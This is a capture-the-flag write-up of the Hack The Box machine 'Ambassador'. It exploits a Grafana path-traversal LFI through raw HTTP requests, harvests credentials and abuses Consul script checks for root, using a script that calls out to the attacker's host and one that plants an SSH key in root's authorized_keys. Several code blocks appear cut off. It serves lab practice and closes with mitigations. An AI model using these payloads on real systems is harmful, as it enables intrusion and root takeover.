This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it. 

* Room: Ambassador
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Ambassador](https://app.hackthebox.com/machines/Ambassador)
* Author: [DirectRoot](https://app.hackthebox.com/users/24906)

## Enumeration

I launched Rustscan to check the box for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |

The box had four open ports

* 22 - SSH
* 80 - HTTP
* 3000 - HTTP
* 3306 - MySQL


## Website

I opened a browser and navigated to the site on port 80. 

![Ambassador Development Server](/assets/images/Ambassador/AmbassadorDevelopmentServer.png "Ambassador Development Server")

The site was pretty simple. It had a single post. This post had instructions about connecting to a development environment. It said to use `developer` and that the password would be provided. 

> Connecting to this machine
>
> Use the developer account to SSH, DevOps will give you the password.

I looked around for a hidden password but did not find anything. I ran Feroxbuster to look for hidden pages, but nothing came up.

## Grafana

Next, I looked at what was on port 3000. 

![Grafana](/assets/images/Ambassador/Grafana.png "Grafana")

It was running [Grafana](https://grafana.com/). And it was telling me that it ran version 8.2.0. I looked for vulnerabilities in this version and found that it was vulnerable to [LFI](https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/). There was also a [script on Exploit-DB](https://www.exploit-db.com/exploits/50581) that showed how to abuse it.

All I needed to do was have the path to a plugin followed by a bunch of `../` and the path to the file I wanted to read. The LFI could not be done in a browser, because the extra `../` would get removed. But it worked well in Burp Repeater.

I tried to read `/etc/password`. 

```http
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: redirect_to=%2Fetc%2Fpasswd
Upgrade-Insecure-Requests: 1
```

And it worked.

I found the LFI vulnerability quickly, but from there it took me a while to find how to use it. I read a bunch of files, but nothing I could use to get access to the server.

I read the Grafana configuration. 

```http
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
Host: target.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: redirect_to=%2F
Upgrade-Insecure-Requests: 1
```

It returned a huge configuration file. It contained an admin password.

```ini
#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = REDACTED
```

I used the password to login in Grafana.

![Logged In](/assets/images/Ambassador/LoggedInGrafana.png "Logged In")

I spent some time trying to find something in Grafana. Maybe I could use it to run some commands on the server. But I did not find anything. 

After a while, I went back to the LFI and used it to extract an SQLite database.

```http
GET /public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1
Host: target.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: redirect_to=%2F
Upgrade-Insecure-Requests: 1
```

I copied the database locally and looked around. The `user` table looked promising. But it only contained the admin user, and I already had their password.

The `data_source` table was more interesting.

Port 3306 was open, so I tried connecting to it.

```bash

It worked, so I looked around. There was a suspicious `whackywidget` database.

The database had a `users` table that contained a base64 encoded password. I decoded it, and used the password to SSH to the server as `developer` and get the user flag. 

```bash
$ echo -n  SOME_BASE64 | base64 -d

## Privilege Escalation

### Static Site Generator

Once connected, I started looking around the server. I quickly found a folder that contained the source for the site on port 80.

```

The deploy script was using the [Hugo static site generator](https://gohugo.io/) to build the site from Markdown files. 

I listed the content of `public` and the webroot. It looked like the deploy script was being run by root.

I tried modifying the Markdown for the post and the deploy script. I thought that if the deploy script was running on a cron I could get code execution as root this way. But it never ran, so I moved to something else.

### Consul

When I extracted `/etc/passwd` with the LFI, I saw that the server had a `consul` user. I looked to see if [Consul](https://www.consul.io/) was running. 

```bash
developer@ambassador:~$ ps aux | grep consul
root        1022  0.5  3.7 794292 74328 ?        Ssl  15:25   0:02 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
```

It was running. I looked into the configuration folder and saw that my user could write some configurations. 

```bash
developer@ambassador:~$ cd /etc/consul.d/

developer@ambassador:/etc/consul.d$ ls -la
total 24
drwxr-xr-x   3 consul consul    4096 Sep 27 14:49 .
drwxr-xr-x 103 root   root      4096 Sep 27 14:49 ..
drwx-wx---   2 root   developer 4096 Nov 11 16:04 config.d
-rw-r--r--   1 consul consul       0 Feb 28  2022 consul.env
-rw-r--r--   1 consul consul    5303 Mar 14  2022 consul.hcl
-rw-r--r--   1 consul consul     160 Mar 15  2022 README

developer@ambassador:/etc/consul.d$ echo TEST > config.d/test

developer@ambassador:/etc/consul.d$ cat config.d/test
TEST
```

The `consul.hcl` also had an interesting setting at the end.

```ini
enable_script_checks = true
```

I looked at the [documentation of this setting](https://developer.hashicorp.com/consul/docs/agent/config/cli-flags#_enable_script_checks) and saw a warning saying it could be used to get remote code execution.

> enable_script_checks: enable script checks regardless of how they are defined.
Security Warning: Enabling script checks in some configurations may introduce a remote execution vulnerability which is known to be targeted by malware. We strongly recommend enable_local_script_checks instead. See this blog post for more details.

At this point, I thought I had an easy way to get root. I had to create a [health check script](https://developer.hashicorp.com/consul/tutorials/developer-discovery/service-registration-health-checks) that would open a reverse shell to my machine and drop it in `/etc/consul.d/config.d/` to get it executed.

To test it, I create a small script that would hit my web server.

```bash
developer@ambassador:~$ cat /tmp/exploit.sh 
#!/bin/bash

wget http://10.10.14.143/consul
```

I created the configuration file and copied it to the folder I could write to.

```bash
developer@ambassador:~$ cat eric.json
{
    "check": {
            "name": "eric",
            "args": [
              "/tmp/exploit.sh"
            ],
            "interval": "10s",
            "timeout": "1s"
    }
}
developer@ambassador:~$ cp eric.json /etc/consul.d/config.d/
```

Then I waited, hoping that just dropping the configuration file was enough to get Consul to read it. It was not. I needed to find a way to get the service to reload its configuration. But it was running as root, so I could not restart it.

I tried using the command line to register my service. 

```bash
consul services register /etc/consul.d/config.d/eric.json
```

It returned without any errors, but it did not do anything. 

I also tried the API to register it. This time I got a `Permission denied` error.

```bash
developer@ambassador:/opt/my-app/whackywidget$ curl --request PUT --data @/home/developer/eric.json http://127.0.0.1:8500/v1/agent/service/register
Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'service:write' on "counting"
```

### Whacky Widget

I got stuck here for some time. I was trying to find a way to register the new service or get Consul to restart. But only root could do that.

I found an app in `opt`.

```bash
developer@ambassador:/etc/consul.d$ ls -l /opt/
total 8
drwxr-xr-x 4 consul consul 4096 Mar 13  2022 consul
drwxrwxr-x 5 root   root   4096 Mar 13  2022 my-app

developer@ambassador:/etc/consul.d$ ls -l /opt/consul/

-rw-r--r-- 1 consul consul  394 Mar 13  2022 checkpoint-signature
-rw------- 1 consul consul   36 Mar 13  2022 node-id
drwxr-xr-x 3 consul consul 4096 Mar 13  2022 raft
drwxr-xr-x 2 consul consul 4096 Mar 13  2022 serf

developer@ambassador:/etc/consul.d$ ls -l /opt/my-app/
total 8
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
```

It looked like the widget from the MySQL database I had used to get the SSH password.

```bash
developer@ambassador:/etc/consul.d$ cd /opt/my-app/whackywidget/

developer@ambassador:/opt/my-app/whackywidget$ ls
manage.py  put-config-in-consul.sh  whackywidget

developer@ambassador:/opt/my-app/whackywidget$ cat put-config-in-consul.sh 
# We use Consul for application config in production, this script will help set the correct values for the app
# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running

consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD

developer@ambassador:/opt/my-app/whackywidget$ consul kv get whackywidget/db/mysql_pw
Error querying Consul agent: Unexpected response code: 403 (Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'key:read' on "whackywidget/db/mysql_pw")
```

The script was adding a password to Consul. But I did not have permission to access it. Again, it needed to run as root. I kept looking on the server. I ran [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) on it. It found what I needed, but I missed it when looking at the results.

Eventually, I was going back to the widget code to see if I missed something. I was using `tab-tab` to get Bash to autocomplete the paths for me. And when it displayed the list of folders in `/opt/my-app`, I saw what I had missed in linPEAS.

```bash
developer@ambassador:~$ cd /opt/
consul/ my-app/ 

developer@ambassador:~$ cd /opt/my-app/
env/          .git/         whackywidget/ 
```

There was a `.git` folder. I changed the app folder and checked the Git history. 

```bash
developer@ambassador:~$ cd /opt/my-app/
developer@ambassador:/opt/my-app$ git status

```

The previous commit was using a token to set the password in Consul. I tried using the token to reload the configuration and it worked.

### Success 

```bash
developer@ambassador:/opt/my-app$ consul reload --token REDACTED
Configuration reload triggered
```

I had to copy my configuration again since the cleanup script had erased it. I reloaded again, and a few seconds later, I got a hit on my web server. I had code execution.

```
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


10.129.228.56 - - [11/Nov/2022 15:10:07] code 404, message File not found
10.129.228.56 - - [11/Nov/2022 15:10:07] "GET /consul HTTP/1.1" 404 -
```

I modified the exploit script to open a reverse shell instead of sending a web request. A few seconds later, I got a hit on my netcat listener. I was connected as root, but the connection got closed immediately. I thought it was the timeout of 1 second that killed it so I changed it to 24 hours. But my connection got killed anyway.

I could have tried to figure it out, but I thought it would be simpler to go another way. I changed the script to copy my SSH public key to root's authorized keys.

```bash
developer@ambassador:~$ cat /tmp/exploit.sh
#!/bin/bash

mkdir /root/.ssh/
chmod 700 /root/.ssh

echo -n "ssh-rsa AAAA..." > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

Then, I connected as root and read the flag.

```bash
$ ssh root@target

## Mitigation

This machine was really fun. There were multiple vulnerabilities that I had to use to get to root, but they would be simple to fix if I wanted to make the box more secure.

The first issue was with the version of Grafana. The version used has a known vulnerability, so it should have been updated. The admin password should also have been changed. I was not able to use my access to Grafana to gain access. But on a real server, this could allow an attacker to access sensitive data.

Next, the MySQL port should not have been open on the internet. It should only be available to the servers that need access to it. In this case, localhost would have been enough. There was also a password stored in clear in that database. It should have been hashed, not encoded.

Once on the machine, I should not have been allowed to write to the Consul configuration. Even without the ability to restart the service, on a real server, I could have waited for the server to reboot and get code execution then.

Having the Git repository on the machine was also a problem. There is no reason to have the repository on the server. The deployment should only send the needed files. 

And if credentials are committed to a Git repository they should be invalided immediately. Removing them from the code is not enough. Anyone with access to the repo can see them, and use them if they are still valid.
